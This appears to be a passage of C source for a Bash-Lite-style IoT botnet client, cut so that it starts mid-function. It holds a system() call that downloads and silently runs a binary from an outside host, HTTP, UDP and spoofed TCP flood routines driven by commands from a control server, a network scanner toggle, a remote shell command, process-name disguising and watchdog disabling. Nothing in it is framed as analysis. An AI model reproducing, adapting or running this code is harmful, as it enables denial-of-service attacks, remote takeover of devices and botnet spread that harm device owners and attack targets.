sprintf(request2, "%s %s HTTP/1.0\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", method, path, connections[(rand() % 3)], useragents[(rand() % 14)]);
system("wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")

for (i = 0; i < power; i++) {
if (fork()) {
while (timeEnd > time(NULL)) {
int socket = socket_connect((char *)host, port);
if (socket != 0) {
write(socket, request, strlen(request));
write(socket, request2, strlen(request2));
read(socket, buffer, 1);
close(socket);
write(socket, request, strlen(request));
write(socket, request2, strlen(request2));
close(socket);
}
}
_exit(1);
}
}
}

void processCmd(int argc, unsigned char *argv[])
{
	int x;

        if(!strcmp(argv[0], "SC"))
        {
                if(argc != 2)
                {
                        return;
                }

                if(!strcmp(argv[1], "OFF"))
                {
                        if(scanPid == 0) return;
                        kill(scanPid, 9);
                        scanPid = 0;
                }

                if(!strcmp(argv[1], "ON"))
                {
                        if(scanPid != 0) return;
                        uint32_t parent;
                        parent = fork();
						
                        if (parent > 0) { scanPid = parent; return;}
                        else if(parent == -1) return;
                        StartTheLelz();
                        _exit(0);
                }
        }
	
       
if (!strcmp((const char *)argv[0], "H")) {
if (argc < 6) {
return; }
if (strstr((const char *)argv[1], ",") != NULL) {
unsigned char *hi = (unsigned char *)strtok((char *)argv[1], ",");
while (hi != NULL) {
if (!listFork()) {
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0); }
hi = (unsigned char *)strtok(NULL, ","); }
} else {
if (listFork()) {
return; }
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
}
	//!* UDP IP PORT TIME SIZE
        if(!strcmp(argv[0], "U"))
        {
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[5]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendUDP(hi, port, time, packetsize);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendUDP(ip, port, time, packetsize);
                        _exit(0);
                }
        }
		
		
		if(!strcmp(argv[0], "S"))
		{
			if(argc < 5)
            {
                        
                        return;
            }
			
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			int psize = atoi(argv[4]);
			
			if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendSTD(hi, port, time, psize);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendSTD(ip, port, time, psize);
                        _exit(0);
                }
			
		}
	if(!strcmp(argv[0], "R")) {
        if(argc < 2 || atoi(argv[1]) == -1){
   }else{
       rangechoice = atoi(argv[1]);
    } 
   return;
}
	
        if(!strcmp(argv[0], "T"))
        {
                if(argc < 6)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int psize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }

	if(!strcmp(argv[0], "KT"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
        }

		
}

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; } 
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = Server_Botport;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock == -1) return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
        if(err == -1) return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);
        if(err == -1) return 0;

        ourIP.s_addr = name.sin_addr.s_addr;

        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if(strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while(*pos != '\t') pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if(*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}

char *getBuild()
{
	if(access("/usr/bin/python", F_OK) != -1){
		return "SERVER";
	} else {
		return "ROUTER";
	}
}

int main(int argc, unsigned char *argv[])
{
	
		char *mynameis;
		
		if(access("/usr/bin/python", F_OK) != -1){
			mynameis = randomString(9);
		} else {
			mynameis = randomString(11);
		}
		
		if(geteuid() == 0){
			userID = 0;
		}
		
		char *Buildz = getBuild();
		if(Buildz == "SERVER")
		{
			//If python is installed
			
  	    } else {
			//If python is not installed
			
		}
        
        if(SERVER_LIST_SIZE <= 0) return 0;
		printf("BUILD %s\n", getBuild());
        printf("\x1b[31m[Bash-Lite] \x1b[32mConnected\x1b[0m\r\n");
	    strncpy(argv[0],"",strlen(argv[0]));
    	sprintf(argv[0], mynameis);
    	prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
		srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
	    printf("\x1b[31m[Bash-Lite] \x1b[32mEngaging Scanner\x1b[0m\r\n");
        getOurIP();

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                                        //N
                        }
        } else {
            //N
        } 
	int wfd;
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
        chdir("/");

        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }

		sockprintf(mainCommSock, "\x1b[31m[Bash-Lite] \x1b[32mConnected [%s] [%s]\x1b[0m", getBuild(), inet_ntoa(ourIP));


                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        if(strstr(commBuf, "DUP") == commBuf) exit(0);

                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                //send shell 
                                if(strcmp(command, "hax") == 0)
                                {
                                        unsigned char buf[1024];
                                        int command;
                                        if (listFork()) continue;
                                        memset(buf, 0, 1024);
                                        szprintf(buf, "%s 2>&1", message);
                                        command = fdpopen(buf, "r");
                                        while(fdgets(buf, 1024, command) != NULL)
                                        {
                                                trim(buf);
                                                memset(buf, 0, 1024);
                                                sleep(1);
                                        }
                                        fdpclose(command);
                                        exit(0);
                                }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
               
        }

        return 0;
}

